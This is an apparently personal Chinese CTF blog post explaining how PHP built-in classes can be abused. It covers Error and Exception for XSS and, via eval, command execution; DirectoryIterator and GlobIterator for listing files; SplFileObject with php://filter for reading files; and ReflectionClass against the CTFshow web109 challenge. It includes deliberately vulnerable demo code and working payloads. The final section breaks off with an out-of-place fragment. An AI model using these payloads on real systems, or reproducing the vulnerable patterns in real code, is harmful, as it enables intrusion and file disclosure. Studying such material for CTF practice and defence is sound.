@@ -1,0 +1,312 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>PHP原生类在CTF当中的应用🛴 | ch1e的自留地</title>
+<link rel="shortcut icon" href="https://ch0x01e.github.io/favicon.ico?v=1709471671274">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://ch0x01e.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="PHP原生类在CTF当中的应用🛴 | ch1e的自留地 - Atom Feed" href="https://ch0x01e.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="PHP原生类的应用
+前几天打了浙江省赛，拿了个省二，明年努努力冲个省一。发现浙江省赛出了两题POP链，这就是为啥博客持续在更新反序列化的内容的原因哈哈哈(因为我两题都没解出来)，之前练了一下pop链的构造，现在来研究一下PHP原生类的利用
+..." />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://ch0x01e.github.io">
+  <img class="avatar" src="https://ch0x01e.github.io/images/avatar.png?v=1709471671274" alt="">
+  </a>
+  <h1 class="site-title">
+    ch1e的自留地
+  </h1>
+  <p class="site-description">
+    Manners maketh man
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+      
+        <a href="https://ch1e.cn/post/friends" class="menu">
+          友链
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              PHP原生类在CTF当中的应用🛴
+            </h2>
+            <div class="post-info">
+              <span>
+                2022-10-16
+              </span>
+              <span>
+                5 min read
+              </span>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h1 id="php原生类的应用">PHP原生类的应用</h1>
+<p>前几天打了浙江省赛，拿了个省二，明年努努力冲个省一。发现浙江省赛出了两题POP链，这就是为啥博客持续在更新反序列化的内容的原因哈哈哈(因为我两题都没解出来)，之前练了一下pop链的构造，现在来研究一下PHP原生类的利用</p>
+<p>本篇文章总结于https://blog.csdn.net/qq_38154820/article/details/121112935</p>
+<h2 id="报错类">报错类</h2>
+<h3 id="error">Error</h3>
+<p>在PHP7版本中，因为Error中带有<code>__toString</code>方法，该方法会将传入给<code>__toString</code>的参数原封不动的输出到浏览器。在这么一个过程中可能会产生XSS。</p>
+<p>我们来随便弄一个DEMO试试</p>
+<pre><code class="language-php">&lt;?php
+$a=$_GET['a'];
+$b=$_GET['b'];
+echo new $a($b);
+</code></pre>
+<p>ERROR类中自动带有tostring魔术方法，我们如果这里把他当字符串输出，会自动触发tostring方法，如果这里是echo，即可造成XSS</p>
+<p>Payload：</p>
+<pre><code>http://127.0.0.1/?a=Error&amp;b=&lt;script&gt;alert('xss')&lt;/script&gt;
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220411174642487.png" alt="image-20220411174642487" loading="lazy"></figure>
+<h3 id="exception">Exception</h3>
+<p>和Error类一样，也自带tostring方法，也可以造成XSS</p>
+<figure data-type="image" tabindex="2"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220411174646116.png" alt="image-20220411174646116" loading="lazy"></figure>
+<p>既然如此，可以会被PHP执行，我们可以换一种写法，用eval()函数让他造成RCE即可在实战中使用</p>
+<p>DEMO:</p>
+<pre><code class="language-php">&lt;?php
+$a=$_GET['a'];
+$b=$_GET['b'];
+eval(&quot;echo new $a($b);&quot;);
+</code></pre>
+<figure data-type="image" tabindex="3"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220411174649940.png" alt="image-20220411174649940" loading="lazy"></figure>
+<p>payload:</p>
+<pre><code>?a=Exception&amp;b=system(&quot;whoami&quot;)
+</code></pre>
+<p>因为echo new <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>a</mi><mo>(</mo></mrow><annotation encoding="application/x-tex">a(</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">a</span><span class="mopen">(</span></span></span></span>b);会输出system(&quot;whoami&quot;)，然后会被eval放入代码中去执行，即可造成RCE</p>
+<h2 id="遍历目录类">遍历目录类</h2>
+<h3 id="directoryiterator">DirectoryIterator</h3>
+<p>DirectoryIterator类中有一个__construct()方法，他会构造一个迭代器，如果使用echo进行输出，他会返回迭代器的第一个</p>
+<p>demo:</p>
+<pre><code class="language-php">&lt;?php
+$a=$_GET['a'];
+$b=$_GET['b'];
+echo new $a($b);
+</code></pre>
+<p>我们这时候如果传入</p>
+<pre><code>?a=DirectoryIterator&amp;b=.
+</code></pre>
+<p>此时是遍历当前目录，他回返回第一项，也就应该是一个点</p>
+<figure data-type="image" tabindex="4"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220411174654481.png" alt="image-20220411174654481" loading="lazy"></figure>
+<p>有的师傅就说了，这有个勾八用，我们其实还可以使用glob://协议进行匹配其余的文件</p>
+<p>例如:</p>
+<pre><code>?a=DirectoryIterator&amp;b=glob://flag*
+</code></pre>
+<p>这里的*依旧是通配符，就会匹配当前目录下的带有flag的文件</p>
+<figure data-type="image" tabindex="5"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220411174657529.png" alt="image-20220411174657529" loading="lazy"></figure>
+<p>这里如果不知道文件名，可以直接暴力搜索，使用正则匹配去使用</p>
+<p>例如</p>
+<pre><code>?a=DirectoryIterator&amp;b=glob://f[a-z]*
+</code></pre>
+<figure data-type="image" tabindex="6"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220411174700196.png" alt="image-20220411174700196" loading="lazy"></figure>
+<h3 id="filesystemiterator">FilesystemIterator</h3>
+<p>和Directorylterator差不多，不重复赘述</p>
+<h3 id="globiterator">GlobIterator</h3>
+<p>GlobIterator和另外两个类差不多，不过glob是GlobIterator类本身自带的，因此在遍历的时候，就不需要带上glob协议头了，只需要后面的相关内容</p>
+<pre><code>?a=GlobIterator&amp;b=f[a-z]*
+</code></pre>
+<h2 id="读取文件类">读取文件类</h2>
+<h3 id="splfileobject">SplFileObject</h3>
+<p>SplFileObject类为文件提供了一个面向对象接口，也就是这个类可以用来读文件</p>
+<p>DEMO:</p>
+<pre><code class="language-php">&lt;?php
+$a = $_GET['a'];
+$b = $_GET['b'];
+echo new $a($b);
+</code></pre>
+<p>我们传入?a=SplFileObject&amp;b=flag.php，即可读取我们flag.php里面的内容</p>
+<figure data-type="image" tabindex="7"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220411174703887.png" alt="image-20220411174703887" loading="lazy"></figure>
+<p>除了直接传文件名之外，我们是不是可以联系到php伪协议呢？不妨来试试，传入如下payload</p>
+<pre><code>?a=SplFileObject&amp;b=php://filter/convert.base64-encode/resource=flag.php
+</code></pre>
+<figure data-type="image" tabindex="8"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220411174709053.png" alt="image-20220411174709053" loading="lazy"></figure>
+<h2 id="反射类">反射类</h2>
+<h3 id="reflectionclass">ReflectionClass</h3>
+<p>ReflectionClass反射类在PHP5新加入，继承自Reflector，它可以与已定义的类建立映射关系，通过反射类可以对类操作</p>
+<p>反射类不仅仅可以建立对类的映射，也可以<strong>建立对PHP基本方法的映射</strong>，并且返回基本方法执行的情况。因此可以通过建立反射类<code>new ReflectionClass(system('cmd'))</code>来执行命令</p>
+<p>这里我们直接使用CTFshow的web109来作为例题</p>
+<pre><code class="language-php">&lt;?php 
+
+/* 
+# -*- coding: utf-8 -*- 
+# @Author: h1xa 
+# @Date:   2020-09-16 11:25:09 
+# @Last Modified by:   h1xa 
+# @Last Modified time: 2020-09-29 22:02:34 
+
+*/ 
+
+
+highlight_file(__FILE__); 
+error_reporting(0); 
+if(isset($_GET['v1']) &amp;&amp; isset($_GET['v2'])){ 
+    $v1 = $_GET['v1']; 
+    $v2 = $_GET['v2']; 
+
+    if(preg_match('/[a-zA-Z]+/', $v1) &amp;&amp; preg_match('/[a-zA-Z]+/', $v2)){ 
+            eval(&quot;echo new $v1($v2());&quot;); 
+    } 
+
+} 
+
+?&gt; 
+</code></pre>
+<p>已知了flag在<code>./fl36dg.txt</code>，命令执行<code>system(‘cat fl36dg.txt’)</code>获取flag，所以应该传入如下参数</p>
+<pre><code>v1=ReflectionClass&amp;v2=system(&quot;ls&quot;)
+</code></pre>
+<figure data-type="image" tabindex="9"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220411174715632.png" alt="image-20220411174715632" loading="lazy"></figure>
+<h3 id="reflectionmethod">ReflectionMethod</h3>
+<p>和ReflectionClass一样</p>
+<p><code>Typecho_Db_Exception</code>类在/var/Typecho/Db/Query.php中，这里有一个<code>//__toString()</code>的注释，直接看__toString函数里的内容</p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#php%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9A%84%E5%BA%94%E7%94%A8">PHP原生类的应用</a>
+<ul>
+<li><a href="#%E6%8A%A5%E9%94%99%E7%B1%BB">报错类</a>
+<ul>
+<li><a href="#error">Error</a></li>
+<li><a href="#exception">Exception</a></li>
+</ul>
+</li>
+<li><a href="#%E9%81%8D%E5%8E%86%E7%9B%AE%E5%BD%95%E7%B1%BB">遍历目录类</a>
+<ul>
+<li><a href="#directoryiterator">DirectoryIterator</a></li>
+<li><a href="#filesystemiterator">FilesystemIterator</a></li>
+<li><a href="#globiterator">GlobIterator</a></li>
+</ul>
+</li>
+<li><a href="#%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E7%B1%BB">读取文件类</a>
+<ul>
+<li><a href="#splfileobject">SplFileObject</a></li>
+</ul>
+</li>
+<li><a href="#%E5%8F%8D%E5%B0%84%E7%B1%BB">反射类</a>
+<ul>
+<li><a href="#reflectionclass">ReflectionClass</a></li>
+<li><a href="#reflectionmethod">ReflectionMethod</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://ch0x01e.github.io/post/php-fan-xu-lie-hua-zhi-pop-lian-gou-zao/">
+              <h3 class="post-title">
+                PHP反序列化之POP链构造🛴
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://ch0x01e.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
